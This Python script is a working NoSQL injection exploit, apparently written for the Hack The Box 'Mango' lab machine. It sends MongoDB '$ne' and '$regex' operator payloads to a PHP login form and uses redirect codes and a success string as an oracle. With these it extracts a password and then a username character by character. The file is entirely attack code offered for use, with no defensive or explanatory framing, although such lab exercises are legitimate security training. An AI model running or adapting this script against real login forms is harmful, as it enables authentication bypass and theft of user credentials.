import requests
import string

SUCCESS_STRING = "Under Plantation"

# Reservered regex symbols
blacklist = "*.w^!$+?|\\"

url = "http://staging-order.mango.htb"

headers = {
    "Host": "staging-order.mango.htb",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://staging-order.mango.htb",
    "Connection": "close",
    "Referer": "http://staging-order.mango.htb/",
    "Cookie": "PHPSESSID=tng4oksogvhd4hcojtmfkt420r",
    "Upgrade-Insecure-Requests": "1"
}


password_length = 0
print("\n[*] Calculating password length...")
for x in range(1, 20):
    payload = {"username[$ne]": "x", "password[$regex]": ".{" + str(x) + "}", "login": "login"}

    r = requests.post(url, data=payload, allow_redirects=False)
    if r.status_code != 302:
        print(f"[!] Password length: {x - 1}")
        password_length = x - 1
        break

password = ""
print("\n[*] Finding password...")
for x in range(password_length - 1, -1, -1):

    for c in range(32, 255):

        if not chr(c) in blacklist:

            if x == 0:
                payload = {"username[$ne]": "x", "password[$regex]": password + chr(c), "login": "login"}
            else:
                payload = {"username[$ne]": "x", "password[$regex]": password + chr(c) + ".{" + str(x) + "}", "login": "login"}

            r = requests.post(url, data=payload, allow_redirects=True)
            if SUCCESS_STRING in r.text:
                password += chr(c)
                print(chr(c), end="", flush=True)
                break

    else:
        print("\n[!] ERROR: Value not found!")
        break

print()


username_length = 0
print("\n[*] Calculating username length...")
for x in range(1, 20):
    payload = {"username[$regex]": ".{" + str(x) + "}", "password": f"{password}", "login": "login"}

    r = requests.post(url, data=payload, allow_redirects=False)
    if r.status_code != 302:
        print(f"[!] Username length: {x - 1}")
        username_length = x - 1
        break

username = ""
print("\n[*] Finding username...")
for x in range(username_length - 1, -1, -1):

    for c in range(32, 127):

        if not chr(c) in blacklist:
            payload = {"username[$regex]": username + chr(c) + ".{" + str(x) + "}", "password": f"{password}" , "login": "login"}

            r = requests.post(url, data=payload, allow_redirects=True)
            if SUCCESS_STRING in r.text:
                username += chr(c)
                print(chr(c), end="", flush=True)
                break
    else:
        print("\n[!] ERROR: Value not found!")
        break

print()